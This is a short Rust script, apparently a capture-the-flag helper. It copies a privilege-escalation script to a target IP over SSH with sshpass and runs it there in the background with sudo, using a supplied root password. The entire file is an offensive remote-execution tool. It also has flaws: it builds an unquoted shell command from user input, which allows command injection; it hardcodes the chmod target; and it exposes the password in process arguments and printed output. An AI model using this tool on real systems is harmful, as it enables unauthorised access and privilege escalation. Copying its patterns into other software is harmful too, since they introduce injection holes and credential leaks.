//import relevant crates and stuff
use std::process::Command;
use std::env;
use std::fs;

fn main() {
    //get the flags
    let args: Vec<String> = env::args().collect();
    //if no flags
    if args.len() <= 4 {
        panic!("\nFor this script, enter the root user, root pass, target ip, and file name (NOT FULL PATH!).\nExample: ./1337thebox root qwerty123 10.10.132.177 escalate.sh\n");
    }
    //setting vars based off of flags
    let user = &args[1];
    let pass = &args[2];
    let target_ip = &args[3];
    let file_name = &args[4];

    println!("Script initializing...\n Target user is {}, {}'s password is {}, target IP is {}, and the path to the escalate file is {}.", user, user, pass, target_ip, file_name);
    //read file, handle any error
    match fs::read_to_string(file_name) {
        //Read successfully:
        Ok(file_contents) => {
            if file_contents.trim().is_empty() {
                println!("The file is empty or contains only whitespace, please give a different file.");
            } else {
                
                run_ssh_commands(user, pass, target_ip, file_name);
            }
        },
        //Read unsuccessfully
        Err(e) => {
            println!("Failed to read the file. Error is as follows: {}", e);
        }
    }
}

//ssh command function:
fn run_ssh_commands(user: &str, pass: &str, otherip: &str, file_name: &str) {
    //command for ssh
    let ssh_command = format!("sshpass -p '{}' scp {} {}@{}:~/ && sshpass -p '{}' ssh {}@{} 'chmod +x ~/escalate.sh && sudo nohup ~/{} {} > /dev/null 2>&1 &'",
                              pass, file_name, user, otherip, pass, user, otherip, file_name, pass);

    //command running settings
    let output = Command::new("sh")
        .arg("-c")
        .arg(&ssh_command)
        .output()
        .expect("Failed to execute SSH, not my problem :3");

    if output.status.success() {
        println!("SSH command executed successfully!");
    } else {
        println!("SSH command failed to execute:");
        println!("{}", String::from_utf8_lossy(&output.stderr));
    }
}
